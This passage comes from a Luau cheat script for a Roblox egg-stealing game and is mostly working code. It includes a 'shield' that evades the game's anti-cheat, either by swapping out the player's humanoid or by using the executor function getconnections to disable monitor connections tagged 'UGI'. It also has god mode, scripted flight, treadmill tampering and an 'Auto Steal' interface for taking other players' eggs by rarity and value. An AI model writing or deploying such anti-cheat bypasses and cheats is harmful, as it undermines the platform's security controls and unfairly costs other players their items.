			local shieldMethods = { "Humanoid Swap", "Disable Monitor" }
			chilliState.ShieldMethods = shieldMethods
			local defaultShieldMethod = shieldMethods[1]
			local tempStateFlags = {}
			local monitorConnections = {}
			local cameraConnection = nil
			local jumpCount = 0
			local humanoidSwapState = { Original = nil, Clone = nil, Links = {} }
			local physicsConnection = nil
			local humanoidChangedListeners = {}

			local function fireHumanoidChanged()
				for _, listener in ipairs(humanoidChangedListeners) do
					task.defer(function()
						pcall(listener)
					end)
				end
			end

			chilliState.OnHumanoidChanged = function(listener)
				table.insert(humanoidChangedListeners, listener)
				local connectionWrapper

				connectionWrapper = {
					Connected = true,
					Disconnect = function()
						connectionWrapper.Connected = false
						local index = table.find(humanoidChangedListeners, listener)

						if index then
							table.remove(humanoidChangedListeners, index)
						end
					end,
				}

				return connectionWrapper
			end

			local function reconnectCameraControls(humanoid)
				pcall(function()
					local playerScripts = localPlayer:FindFirstChild("PlayerScripts")
					local playerModule = playerScripts and playerScripts:FindFirstChild("PlayerModule")

					if playerModule then
						local controls = require(playerModule):GetControls()

						if type(controls) == "table" then
							controls.humanoid = humanoid
						end
					end
				end)
			end

			local function resetAnimateScript(character)
				local animate = character and character:FindFirstChild("Animate")

				if animate and animate:IsA("LocalScript") then
					task.spawn(function()
						animate.Enabled = false
						task.wait()
						animate.Enabled = true
					end)
				end
			end

			local function clearHumanoidSwapLinks()
				for _, link in ipairs(humanoidSwapState.Links) do
					pcall(function()
						link:Disconnect()
					end)
				end

				table.clear(humanoidSwapState.Links)
			end

			chilliState.UndoSwap = function()
				clearHumanoidSwapLinks()
				local character = localPlayer.Character
				local original = humanoidSwapState.Original
				local clone = humanoidSwapState.Clone
				local swapStateRef = humanoidSwapState
				humanoidSwapState.Original = nil
				swapStateRef.Clone = nil

				if original and clone and character and original.Parent == nil and clone.Parent == character then
					original.Parent = character
					workspace.CurrentCamera.CameraSubject = original
					reconnectCameraControls(original)

					pcall(function()
						clone:Destroy()
					end)

					resetAnimateScript(character)
					fireHumanoidChanged()
				end
			end

			local groundedStates = {
				[Enum.HumanoidStateType.Running] = true,
				[Enum.HumanoidStateType.RunningNoPhysics] = true,
				[Enum.HumanoidStateType.Landed] = true,
			}

			chilliState.Grounded = function(humanoid)
				if not humanoid then
					local character = localPlayer.Character
					humanoid = character and character:FindFirstChildOfClass("Humanoid")
				end

				if not humanoid or humanoid.Health <= 0 or humanoid.FloorMaterial == Enum.Material.Air then
					return false
				end
				return groundedStates[humanoid:GetState()] == true
			end

			chilliState.ShieldPaused = false

			chilliState.WalkSpeed = function()
				local character = localPlayer.Character
				character = character and character:FindFirstChildOfClass("Humanoid")
				character = character and character.WalkSpeed or 16
				local original = humanoidSwapState.Original

				if original and original.Health > 0 then
					character = math.min(character, original.WalkSpeed)
				end

				local ok, result = pcall(function()
					local leaderstats = localPlayer:FindFirstChild("leaderstats")
					leaderstats = leaderstats and leaderstats:FindFirstChild("Speed")
					local TreadmillUtil = require(ReplicatedStorage.Shared.Util.TreadmillUtil)
					return leaderstats and TreadmillUtil.SpeedPowerToWalkSpeed(leaderstats.Value) or nil
				end)

				local computedWalkSpeed

				if ok and tonumber(result) and result > 0 then
					computedWalkSpeed = math.min(character, result)
				else
					computedWalkSpeed = character
				end

				return computedWalkSpeed
			end

			local function executeHumanoidSwap()
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")
				if not humanoid or humanoid.Health <= 0 then
					return
				end

				if humanoidSwapState.Clone and humanoidSwapState.Clone.Parent == character then
					return
				end

				if not chilliState.Grounded(humanoid) then
					return
				end
				local clone = humanoid:Clone()
				humanoid.Parent = nil
				clone.Parent = character
				workspace.CurrentCamera.CameraSubject = clone
				reconnectCameraControls(clone)
				resetAnimateScript(character)
				local swapStateRef = humanoidSwapState
				humanoidSwapState.Original = humanoid
				swapStateRef.Clone = clone
				fireHumanoidChanged()

				table.insert(humanoidSwapState.Links, humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
					if clone.Parent ~= nil then
						clone.WalkSpeed = humanoid.WalkSpeed
					end
				end))

				local animator = humanoid:FindFirstChildOfClass("Animator")
				local animator2 = clone:FindFirstChildOfClass("Animator")

				if animator and animator2 then
					table.insert(humanoidSwapState.Links, animator.AnimationPlayed:Connect(function(arg)
						local animation = arg.Animation
						if not animation or clone.Parent == nil then
							return
						end

						local ok, result = pcall(function()
							return animator2:LoadAnimation(animation)
						end)

						if not ok or not result then
							return
						end

						pcall(function()
							result.Priority = arg.Priority
							result.Looped = arg.Looped
							local speed = arg.Speed
							result:Play(0.05, math.max(arg.WeightTarget, 0.01), speed)
						end)

						local connection3 = nil

						connection3 = arg.Stopped:Connect(function()
							connection3:Disconnect()

							pcall(function()
								result:Stop(0.1)
							end)
						end)
					end))
				end

				table.insert(humanoidSwapState.Links, clone.Died:Connect(function()
					clearHumanoidSwapLinks()
					local swapStateRef2 = humanoidSwapState
					humanoidSwapState.Original = nil
					swapStateRef2.Clone = nil
					local character2 = localPlayer.Character

					if character2 and humanoid.Parent == nil then
						humanoid.Parent = character2
						workspace.CurrentCamera.CameraSubject = humanoid
						reconnectCameraControls(humanoid)
						fireHumanoidChanged()
					end

					pcall(function()
						clone:Destroy()
					end)

					humanoid.Health = 0
				end))
			end

			local function disableMonitorConnections()
				if type(getconnections) ~= "function" then
					return
				end

				for _, runEvent in ipairs({ RunService.Heartbeat, RunService.PreSimulation, RunService.PostSimulation }) do
					local ok, result = pcall(getconnections, runEvent)

					if ok and type(result) == "table" then
						for _, conn in ipairs(result) do
							local ok2, result2 = pcall(function()
								return conn.Function
							end)

							local hasFunction = ok2 and type(result2) == "function"
							local hasDebugInfo = false
							local debugSource = nil

							if hasFunction then
								hasDebugInfo, debugSource = pcall(debug.info, result2, "s")
							end

							if hasDebugInfo and string.find(tostring(debugSource), "UGI", 1, true) then
								local ok3, result4 = pcall(function()
									return conn.Enabled
								end)

								if not ok3 or result4 ~= false then
									if pcall(function()
										conn:Disable()
									end) then
										table.insert(monitorConnections, conn)
									end
								end
							end
						end
					end
				end
			end

			local function disableShieldAndRestore()
				if cameraConnection then
					cameraConnection:Disconnect()
					cameraConnection = nil
				end

				if physicsConnection then
					physicsConnection:Disconnect()
					physicsConnection = nil
				end

				for _, conn in ipairs(monitorConnections) do
					pcall(function()
						conn:Enable()
					end)
				end

				table.clear(monitorConnections)
			end

			local function applyCurrentShield()
				if chilliState.ShieldPaused then
					return
				end

				if defaultShieldMethod == shieldMethods[1] then
					executeHumanoidSwap()
				else
					disableMonitorConnections()
				end
			end

			local function enableShieldSystem()
				applyCurrentShield()
				jumpCount = 0

				cameraConnection = RunService.Heartbeat:Connect(function(deltaTime)
					jumpCount += deltaTime
					local character = localPlayer.Character
					local isSwapMethod = defaultShieldMethod == shieldMethods[1]

					if isSwapMethod then
						isSwapMethod = not (humanoidSwapState.Clone and character and humanoidSwapState.Clone.Parent == character)
					end

					if (isSwapMethod and 0.25 or 3) <= jumpCount then
						jumpCount = 0
						applyCurrentShield()
					end
				end)

				physicsConnection = localPlayer.CharacterAdded:Connect(function(character)
					clearHumanoidSwapLinks()
					local swapStateRef = humanoidSwapState
					humanoidSwapState.Original = nil
					swapStateRef.Clone = nil
					if defaultShieldMethod ~= shieldMethods[1] then
						return
					end

					task.spawn(function()
						character:WaitForChild("Humanoid", 10)
						task.wait(1)

						if cameraConnection and localPlayer.Character == character then
							applyCurrentShield()
						end
					end)
				end)
			end

			chilliState.Swapped = function()
				if defaultShieldMethod ~= shieldMethods[1] then
					return true
				end
				local character = localPlayer.Character
				return humanoidSwapState.Clone ~= nil and character ~= nil and humanoidSwapState.Clone.Parent == character
			end

			chilliState.Shield = function(moduleName, isEnabled)
				tempStateFlags[moduleName] = isEnabled == true or nil
				if next(tempStateFlags) == nil then
					disableShieldAndRestore()
					return
				end

				if cameraConnection then
					return
				end
				enableShieldSystem()
			end

			chilliState.SetShieldMethod = function(methodName)
				if not table.find(shieldMethods, methodName) or methodName == defaultShieldMethod then
					return
				end
				local isSystemActive = cameraConnection ~= nil
				disableShieldAndRestore()
				defaultShieldMethod = methodName

				if isSystemActive and next(tempStateFlags) ~= nil then
					enableShieldSystem()
				end
			end

			trackCleanup(disableShieldAndRestore)
		end

		chilliState.Shield("load", true)

		chilliState.Toggle = function(uiElement, fallbackValue)
			if type(uiElement) ~= "table" then
				return fallbackValue == true
			end

			local ok, elementValue = pcall(function()
				local controller = uiElement._controller
				return type(controller) == "table" and type(controller.GetValue) == "function" and controller.GetValue()
			end)

			if ok and type(elementValue) == "boolean" then
				return elementValue
			end

			for _, methodName in ipairs({ "Get", "GetValue" }) do
				local ok2, result2 = pcall(function()
					return uiElement[methodName]
				end)

				if ok2 and type(result2) == "function" then
					local ok3, result3 = pcall(result2, uiElement)
					if ok3 and type(result3) == "boolean" then
						return result3
					end
				end
			end

			return fallbackValue == true
		end

		chilliState.Root = function()
			local character = localPlayer.Character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			return humanoidRootPart and humanoidRootPart:IsDescendantOf(workspace) and humanoidRootPart or nil
		end

		chilliState.PlacedPoints = function()
			local placedEggRenders = workspace:FindFirstChild("PlacedEggRenders")
			local pointsList = {}
			if not placedEggRenders then
				return pointsList
			end
			local userIdStr = tostring(localPlayer.UserId)

			for _, child in ipairs(placedEggRenders:GetChildren()) do
				if string.find(child.Name, userIdStr, 1, true) then
					local ok, result = pcall(function()
						return child:IsA("Model") and child:GetPivot() or child.CFrame
					end)

					if ok then
						table.insert(pointsList, result.Position)
					end
				end
			end

			return pointsList
		end

		chilliState.OwnPlot = function()
			local plots = workspace:FindFirstChild("Plots")
			if not plots then
				return nil
			end

			for _, child in ipairs(plots:GetChildren()) do
				local plotSign = child:FindFirstChild("PlotSign")
				plotSign = plotSign and plotSign:FindFirstChild("PlayerPlotSign")
				plotSign = plotSign and plotSign:FindFirstChild("Frame")
				plotSign = plotSign and plotSign:FindFirstChild("PlayerName")

				if plotSign and plotSign:IsA("TextLabel") then
					local plotOwnerNameLower = string.lower(plotSign.Text)
					if plotOwnerNameLower == string.lower(localPlayer.Name) or plotOwnerNameLower == string.lower(localPlayer.DisplayName) then
						return child
					end
				end
			end

			return nil
		end

		local function getCenterOfPlacedEggs()
			local placedPoints = chilliState.PlacedPoints()
			if #placedPoints == 0 then
				return nil
			end
			local sumVector = Vector3.zero

			for _, point in ipairs(placedPoints) do
				sumVector += point
			end

			return sumVector / #placedPoints
		end

		chilliState.PenAnchor = function()
			local eggsCenter = getCenterOfPlacedEggs()
			if eggsCenter then
				return eggsCenter
			end
			local plot = chilliState.OwnPlot()
			if not plot then
				return nil
			end
			local toUpdate = plot:FindFirstChild("ToUpdate")
			local starterPen = toUpdate and toUpdate:FindFirstChild("StarterPen") or plot:FindFirstChild("CenterPoint")
			if not starterPen then
				return nil
			end

			local ok, result = pcall(function()
				return starterPen:IsA("Model") and starterPen:GetPivot() or starterPen.CFrame
			end)

			return ok and result.Position or nil
		end

		chilliState.Plot = function()
			local ownedPlot = chilliState.OwnPlot()
			if ownedPlot then
				return ownedPlot
			end
			local plots = workspace:FindFirstChild("Plots")
			local eggsCenter = getCenterOfPlacedEggs()
			if not plots or not eggsCenter then
				return nil
			end
			local closestDistance = math.huge
			local closestPlot = nil

			for _, child in ipairs(plots:GetChildren()) do
				local ok, plotCFrame, plotSize = pcall(function()
					return child:GetBoundingBox()
				end)

				if ok and plotCFrame and plotSize then
					local relativePos = plotCFrame:PointToObjectSpace(eggsCenter)
					local halfX = plotSize.X / 2
					local isInsideX = math.abs(relativePos.X) <= halfX

					if isInsideX then
						local halfZ = plotSize.Z / 2
						isInsideX = math.abs(relativePos.Z) <= halfZ
					end

					if isInsideX then
						return child
					end
					local magnitude = (plotCFrame.Position - eggsCenter).Magnitude

					if magnitude < closestDistance then
						closestPlot = child
						closestDistance = magnitude
					end
				end
			end

			if closestPlot and closestDistance <= 60 then
				return closestPlot
			end
			return nil
		end

		chilliState.Belt = function()
			local plot = chilliState.Plot()
			if not plot then
				return nil
			end
			local treadmillBottom = plot:FindFirstChild("TreadmillBottom")
			if treadmillBottom and treadmillBottom:IsA("BasePart") then
				return treadmillBottom
			end
			local clientTreadmillRenders = workspace:FindFirstChild("__ClientTreadmillRenders")
			clientTreadmillRenders = clientTreadmillRenders and clientTreadmillRenders:FindFirstChild("TreadmillRender_" .. plot.Name)
			local boundingBoxPart = clientTreadmillRenders and (clientTreadmillRenders:FindFirstChild("BoundingBoxPart") or clientTreadmillRenders:IsA("Model") and clientTreadmillRenders.PrimaryPart or clientTreadmillRenders:FindFirstChildWhichIsA("BasePart"))
			if boundingBoxPart then
				return boundingBoxPart
			end
			local treadmillUpgrade = plot:FindFirstChild("TreadmillUpgrade")
			return treadmillUpgrade and treadmillUpgrade:FindFirstChildWhichIsA("BasePart") or nil
		end

		chilliState.DistanceTo = function(targetPosition)
			local rootPart = chilliState.Root()
			if not rootPart or not targetPosition then
				return math.huge
			end
			return (rootPart.Position - targetPosition).Magnitude
		end

		do
			local hiddenBeltParts = {}
			local beltHoldCount = 0

			local function getBeltParts()
				local plot = chilliState.Plot()
				if not plot then
					return {}
				end
				local parts = {}

				for _, partName in ipairs({ "TreadmillBottom", "TreadmillUpgrade" }) do
					local partOrModel = plot:FindFirstChild(partName)

					if partOrModel then
						if partOrModel:IsA("BasePart") then
							table.insert(parts, partOrModel)
						else
							for _, descendant in ipairs(partOrModel:GetDescendants()) do
								if descendant:IsA("BasePart") then
									table.insert(parts, descendant)
								end
							end
						end
					end
				end

				local clientTreadmillRenders = workspace:FindFirstChild("__ClientTreadmillRenders")
				clientTreadmillRenders = clientTreadmillRenders and clientTreadmillRenders:FindFirstChild("TreadmillRender_" .. plot.Name)

				if clientTreadmillRenders then
					for _, descendant in ipairs(clientTreadmillRenders:GetDescendants()) do
						if descendant:IsA("BasePart") then
							table.insert(parts, descendant)
						end
					end
				end

				return parts
			end

			local function hideBeltParts()
				for _, part in ipairs(getBeltParts()) do
					if not hiddenBeltParts[part] then
						hiddenBeltParts[part] = {
							CFrame = part.CFrame,
							CanTouch = part.CanTouch,
							CanCollide = part.CanCollide,
							Transparency = part.Transparency,
						}

						pcall(function()
							part.CanTouch = false
							part.CanCollide = false
							part.Transparency = 1
							part.CFrame = part.CFrame - Vector3.new(0, 120, 0)
						end)
					end
				end
			end

			local function restoreBeltParts()
				for part, originalProperties in pairs(hiddenBeltParts) do
					if part and part.Parent then
						pcall(function()
							part.CFrame = originalProperties.CFrame
							part.CanTouch = originalProperties.CanTouch
							part.CanCollide = originalProperties.CanCollide
							part.Transparency = originalProperties.Transparency
						end)
					end
				end

				table.clear(hiddenBeltParts)
			end

			chilliState.HoldBelt = function()
				beltHoldCount += 1
				hideBeltParts()
			end

			chilliState.ReleaseBelt = function()
				beltHoldCount = math.max(0, beltHoldCount - 1)

				if beltHoldCount == 0 then
					restoreBeltParts()
				end
			end

			chilliState.BeltHeld = function()
				return beltHoldCount > 0
			end

			chilliState.RefreshBeltHide = function()
				if beltHoldCount > 0 then
					hideBeltParts()
				end
			end

			trackCleanup(function()
				beltHoldCount = 0
				restoreBeltParts()
			end)

			chilliState.LeaveBelt = function()
				local rfTreadmillAskDoff = networking:FindFirstChild("RF/Treadmill/AskDoff")

				if rfTreadmillAskDoff and rfTreadmillAskDoff:IsA("RemoteFunction") then
					pcall(rfTreadmillAskDoff.InvokeServer, rfTreadmillAskDoff)
				end
			end

			chilliState.Treadmill = { Riding = false }

			chilliState.ResetBelt = function()
				beltHoldCount = 0
				restoreBeltParts()
			end

			chilliState.OnBelt = function()
				local beltPart = chilliState.Belt()
				if not beltPart or hiddenBeltParts[beltPart] then
					return false
				end
				local rootPart = chilliState.Root()
				if not rootPart then
					return false
				end
				local relativePos = beltPart.CFrame:PointToObjectSpace(rootPart.Position)
				local halfX = beltPart.Size.X / 2 + 2
				local isInsideX = math.abs(relativePos.X) <= halfX

				if isInsideX then
					local halfZ = beltPart.Size.Z / 2 + 2
					isInsideX = math.abs(relativePos.Z) <= halfZ
				end

				return isInsideX and relativePos.Y >= -2 and relativePos.Y <= beltPart.Size.Y / 2 + 8
			end
		end

		chilliState.ExitBelt = function()
			chilliState.Treadmill.Riding = false
			chilliState.LeaveBelt()
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")

			if humanoid then
				pcall(function()
					humanoid.Jump = true
					humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
				end)
			end

			task.wait(0.35)
		end

		chilliState.Flying = false
		chilliState.Driving = 0

		chilliState.BeginFlight = function()
			chilliState.Flying = true
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")

			if humanoid then
				humanoid.PlatformStand = true

				pcall(function()
					humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
				end)
			end

			return chilliState.Root() ~= nil
		end

		chilliState.SetFlightVelocity = function(assemblyLinearVelocity)
			local rootPart = chilliState.Root()

			if rootPart then
				rootPart.AssemblyLinearVelocity = assemblyLinearVelocity
				rootPart.AssemblyAngularVelocity = Vector3.zero
			end
		end

		chilliState.EndFlight = function()
			chilliState.Flying = false
			local rootPart = chilliState.Root()

			if rootPart then
				pcall(function()
					rootPart.AssemblyLinearVelocity = Vector3.zero
					rootPart.AssemblyAngularVelocity = Vector3.zero
				end)
			end

			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")

			if humanoid then
				humanoid.PlatformStand = false
			end
		end

		do
			local disabledHumanoidStates = {
				Enum.HumanoidStateType.FallingDown,
				Enum.HumanoidStateType.Ragdoll,
				Enum.HumanoidStateType.Physics,
				Enum.HumanoidStateType.Seated,
				Enum.HumanoidStateType.PlatformStanding,
			}

			local godModeCollisionStates = {}
			local isGodModeActive = false

			chilliState.GodMode = function(isEnabled)
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")
				if not character or not humanoid then
					return
				end

				if isEnabled then
					isGodModeActive = true

					for _, stateType in ipairs(disabledHumanoidStates) do
						pcall(function()
							humanoid:SetStateEnabled(stateType, false)
						end)
					end

					pcall(function()
						humanoid.BreakJointsOnDeath = false
					end)

					for _, descendant in ipairs(character:GetDescendants()) do
						if descendant:IsA("BasePart") and godModeCollisionStates[descendant] == nil then
							godModeCollisionStates[descendant] = descendant.CanCollide

							pcall(function()
								descendant.CanCollide = false
							end)
						end
					end
				elseif isGodModeActive then
					isGodModeActive = false

					for _, stateType in ipairs(disabledHumanoidStates) do
						pcall(function()
							humanoid:SetStateEnabled(stateType, true)
						end)
					end

					for part, originalCanCollide in pairs(godModeCollisionStates) do
						if part and part.Parent then
							pcall(function()
								part.CanCollide = originalCanCollide
							end)
						end
					end

					table.clear(godModeCollisionStates)
				end
			end
		end

		chilliState.GodTick = function()
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")

			if humanoid and humanoid.Health < humanoid.MaxHealth then
				pcall(function()
					humanoid.Health = humanoid.MaxHealth
				end)
			end
		end

		chilliState.StopWalking = function()
			local character = localPlayer.Character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")

			if humanoid and humanoidRootPart then
				pcall(function()
					humanoid:MoveTo(humanoidRootPart.Position)
					humanoid:Move(Vector3.zero, false)
				end)
			end
		end

		local function performWalkTo(targetPos, reachThreshold, timeoutSec, cancelCondition)
			local actualThreshold = tonumber(reachThreshold) or 6
			local actualTimeout = tonumber(timeoutSec) or 10
			local timeElapsed = 0
			local lastPosition = nil
			local stuckTimer = 0
			local jumpCooldown = 0

			while timeElapsed < actualTimeout do
				if type(cancelCondition) == "function" and cancelCondition() then
					chilliState.StopWalking()
					return false
				end
				local character = localPlayer.Character
				local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")
				if not humanoidRootPart or not humanoid or humanoid.Health <= 0 then
					return false
				end

				if (humanoidRootPart.Position - targetPos).Magnitude <= actualThreshold then
					chilliState.StopWalking()
					return true
				end
				local isStuck = lastPosition and (humanoidRootPart.Position - lastPosition).Magnitude < 1

				if isStuck then
					stuckTimer += 0.2
				else
					stuckTimer = 0
				end

				lastPosition = humanoidRootPart.Position
				jumpCooldown = math.max(0, jumpCooldown - 0.2)

				if stuckTimer >= 0.8 and jumpCooldown <= 0 then
					chilliState.LeaveBelt()

					pcall(function()
						humanoid.Jump = true
					end)

					stuckTimer = 0
					jumpCooldown = 1.5
				end

				humanoid:MoveTo(targetPos)
				timeElapsed += task.wait(0.2)
			end

			chilliState.StopWalking()
			return chilliState.DistanceTo(targetPos) <= actualThreshold
		end

		chilliState.WalkTo = function(targetPos, reachThreshold, timeoutSec, cancelCondition)
			chilliState.Driving = chilliState.Driving + 1
			local ok, result = pcall(performWalkTo, targetPos, reachThreshold, timeoutSec, cancelCondition)
			chilliState.Driving = math.max(0, chilliState.Driving - 1)
			return ok and result == true
		end

		local areaDisplayNames = {
			Boss = "Fractured",
			GreatBloom = "Spirit Bloom",
			Sakura = "Bloom",
			Monstrous = "Parasite",
		}

		task.spawn(function()
			local mutations = gameModules.Mutations

			local ok, result = pcall(function()
				return mutations.All()
			end)

			if ok and type(result) == "table" then
				for key, mutationData in pairs(result) do
					local id = type(mutationData) == "table" and (mutationData.Id or key) or nil
					local label = type(mutationData) == "table" and mutationData.Label or nil

					if id ~= nil and type(label) == "string" and label ~= "" then
						areaDisplayNames[tostring(id)] = label
					end
				end
			end
		end)

		getAreaDisplayName = function(areaId)
			return areaDisplayNames[tostring(areaId)] or tostring(areaId)
		end

		local activeTargetAreas, minRarityValue, targetMutations, targetSpecificEggs, ignoredSpecificEggs, blockedEggsList, isIndexPriorityActive, missingIndexList, minStealValue, speedLimit
		local distanceMax, updateAutoStealState
		local stealPlanQueue, stealPlanSet, stealPlanCancel, eggCooldowns, getWantedEggs

		do
			local defaultTargetAreas = {
				"Forest",
				"Desert",
				"Snow",
				"Lake",
				"Jungle",
				"Volcano",
				"Prehistoric",
				"Cosmic",
				"Abyss Ocean",
				"Cherry Blossom",
				"Light Dark",
				"Titan Temple",
			}

			local targetAreasSet = {}

			for _, areaName in ipairs(defaultTargetAreas) do
				targetAreasSet[areaName] = true
			end

			task.spawn(function()
				local records = fetchFieldEggs()
				if type(records) == "table" then
					for _, record in pairs(records) do
						local areaId = type(record) == "table" and record.AreaId or nil

						if type(areaId) == "string" and not targetAreasSet[areaId] then
							targetAreasSet[areaId] = true
							table.insert(defaultTargetAreas, areaId)
						end
					end
				end
			end)

			filterRarities = { "Any" }
			rarityValues = { Any = 0 }
			local rarityNumberToNameMap = {}
			local directory = gameModules.Assets and gameModules.Assets.Directory

			if type(directory) == "table" then
				for _, assetData in pairs(directory) do
					local rarity = type(assetData) == "table" and assetData.Rarity or nil
					local isRarityValid = type(rarity) == "table"

					if isRarityValid then
						isRarityValid = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					local rarityNum = isRarityValid or nil

					if rarityNum then
						local rarityNameStr = rarityNumberToNameMap[rarityNum]

						if not rarityNameStr then
							rarityNameStr = tostring(rarity.DisplayName or rarity._id or rarityNum)
						end

						rarityNumberToNameMap[rarityNum] = rarityNameStr
					end
				end
			end

			if next(rarityNumberToNameMap) == nil then
				rarityNumberToNameMap = {
					"Common",
					"Uncommon",
					"Rare",
					"Epic",
					"Legendary",
					"Mythic",
					"Cosmic",
					"Secret",
					"Eternal",
					"Divine",
				}
			end

			local sortedRarityNumbers = {}

			for k in pairs(rarityNumberToNameMap) do
				table.insert(sortedRarityNumbers, k)
			end

			table.sort(sortedRarityNumbers)

			for _, rarityNum in ipairs(sortedRarityNumbers) do
				table.insert(filterRarities, rarityNumberToNameMap[rarityNum])
				rarityValues[rarityNumberToNameMap[rarityNum]] = rarityNum
			end

			sortPriorityOptions = { "Best Rarity", "Biggest Weight", "Best Mutation", "Highest Value", "Lowest Value" }
			activeTargetAreas = {}
			minRarityValue = 0
			targetMutations = {}
			targetSpecificEggs = {}
			ignoredSpecificEggs = {}
			blockedEggsList = {}
			stealPlanQueue = targetSpecificEggs
			stealPlanSet = ignoredSpecificEggs
			stealPlanCancel = blockedEggsList
			eggCooldowns = {}
			chilliState.Steal.RiftPriority = false
			chilliState.Steal.RiftNeeds = {}
			isIndexPriorityActive = false
			missingIndexList = {}
			minStealValue = 0
			selectedSortPriority = sortPriorityOptions[4]
			speedLimit = 27.4
			distanceMax = 400
			updateAutoStealState = nil

			autoStealToggle = autoStealSection:CreateToggle({
				Name = "Auto Steal",
				Default = false,
				Callback = function()
					if updateAutoStealState then
						updateAutoStealState()
					end
				end,
			})

			for _, areaName in ipairs(defaultTargetAreas) do
				activeTargetAreas[areaName] = true
			end

			hookDropdownAllLabel(autoStealSection:CreateMultiDropdown({
				Name = "Target Areas",
				Options = defaultTargetAreas,
				Default = defaultTargetAreas,
				Callback = function(arg)
					local selectedAreas = {}

					if type(arg) == "table" then
						for k, v in pairs(arg) do
							if v == true and type(k) == "string" then
								selectedAreas[k] = true
							elseif type(v) == "string" then
								selectedAreas[v] = true
							end
						end
					end

					if next(selectedAreas) == nil then
						for _, areaName in ipairs(defaultTargetAreas) do
							selectedAreas[areaName] = true
						end
					end

					activeTargetAreas = selectedAreas
				end,
			}))
		end

		autoStealSection:CreateDropdown({
			Name = "Min Rarity",
			Note = "Steal eggs of the chosen rarity and every rarity above it",
			Options = filterRarities,
			Default = filterRarities[1],
			Callback = function(arg)
				minRarityValue = rarityValues[arg] or 0
			end,
		})

		formatNumberSuffix(autoStealSection, {
			Name = "Min Steal Value",
			Note = "Skip eggs worth less than this. Drag or type 250k, 50m, 1.5b",
			Legacy = "Min Value To Steal",
			SectionName = "Auto Steal",
			OnRaw = function(arg)
				minStealValue = arg
			end,
		})

		do
			local eggOptionsList = {}
			local eggOptionToCategoryMap = {}
			local directory = gameModules.Assets and gameModules.Assets.Directory
			local tempEggList = {}

			if type(directory) == "table" then
				for categoryId, assetData in pairs(directory) do
					local rarity = type(assetData) == "table" and assetData.Rarity or nil
					local rarityNum = type(rarity) == "table"

					if rarityNum then
						rarityNum = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					rarityNum = rarityNum or nil

					if rarityNum then
						local insert = table.insert
						local eggInfo = { Category = tostring(categoryId) }
						local toStringFunc = tostring
						categoryId = assetData.DisplayName or categoryId
						eggInfo.Name = toStringFunc(categoryId)
						eggInfo.Rarity = rarityNum
						eggInfo.RarityName = tostring(rarity.DisplayName or rarity._id or rarityNum)
						insert(tempEggList, eggInfo)
					end
				end
			end

			table.sort(tempEggList, function(a, b)
				if a.Rarity ~= b.Rarity then
					return a.Rarity > b.Rarity
				end
				return a.Name < b.Name
			end)

			for _, eggInfo in ipairs(tempEggList) do
				local formattedName = string.format("%s [%s]", eggInfo.Name, eggInfo.RarityName)

				if eggOptionToCategoryMap[formattedName] then
					formattedName = string.format("%s [%s] (%s)", eggInfo.Name, eggInfo.RarityName, eggInfo.Category)
				end

				table.insert(eggOptionsList, formattedName)
				eggOptionToCategoryMap[formattedName] = eggInfo.Category
			end

			hookDropdownAllLabel(autoStealSection:CreateMultiDropdown({
				Name = "Target Specific Eggs",
				Note = "Only steal these eggs (empty = all)",
				Options = eggOptionsList,
				Default = {},
				Callback = function(selections)
					local newTargetList = {}

					if type(selections) == "table" then
						for k, selectionValue in pairs(selections) do
							k = selectionValue == true and type(k) == "string" and k

							if k then
								selectionValue = k
							else
								selectionValue = type(selectionValue) == "string" and selectionValue
							end

							selectionValue = selectionValue or nil

							if selectionValue and eggOptionToCategoryMap[selectionValue] then
								newTargetList[eggOptionToCategoryMap[selectionValue]] = true
							end
						end
					end

					targetSpecificEggs = newTargetList
				end,
			}))
		end

		do
			local riftRefreshCooldown = 30
			local riftPriorityToggle = nil
			local isRiftRefreshing = false
			local nextRiftRefreshTime = 0

			local function getOwnedEggCategories()
				local ownedCategories = {}
				local saveModule = gameModules.Save

				if type(saveModule) == "table" and type(saveModule.Get) == "function" then
					local ok, result = pcall(saveModule.Get)

					if ok and type(result) == "table" then
						local pairsFunc = pairs
						local inventory = result.Inventory or {}

						for _, item in pairsFunc(inventory) do
							if type(item) == "table" and item.Category ~= nil then
								ownedCategories[tostring(item.Category)] = true
							end
						end

						local pairsFunc2 = pairs
						local eggInventory = result.EggInventory or {}

						for _, eggItem in pairsFunc2(eggInventory) do
							if type(eggItem) == "table" and eggItem.AssetCategory ~= nil then
								ownedCategories[tostring(eggItem.AssetCategory)] = true
							end
						end
					end
				end

				return ownedCategories
			end

			local function fetchRiftNeeds()
				local scrambleRemote = networking:FindFirstChild("RF/ScrambleTradeIn/AskState")
				if not scrambleRemote or not scrambleRemote:IsA("RemoteFunction") then
					return
				end
				local ok, result = pcall(scrambleRemote.InvokeServer, scrambleRemote)
				if not ok or type(result) ~= "table" or type(result.Requirements) ~= "table" then
					return
				end
				local ownedCategories = getOwnedEggCategories()
				local riftNeeds = {}

				for _, requirement in pairs(result.Requirements) do
					if not ownedCategories[tostring(requirement)] then
						riftNeeds[tostring(requirement)] = true
					end
				end

				chilliState.Steal.RiftNeeds = riftNeeds
			end

			taskScheduler.Add(function()
				if not chilliState.Steal.RiftPriority or isRiftRefreshing or os.clock() < nextRiftRefreshTime then
					return false
				end
				isRiftRefreshing = true
				nextRiftRefreshTime = os.clock() + riftRefreshCooldown

				task.spawn(function()
					pcall(fetchRiftNeeds)
					isRiftRefreshing = false
				end)

				return false
			end)

			local function updateRiftNeedsFromInventory()
				local riftNeeds = chilliState.Steal.RiftNeeds
				if not chilliState.Steal.RiftPriority or next(riftNeeds) == nil then
					return
				end
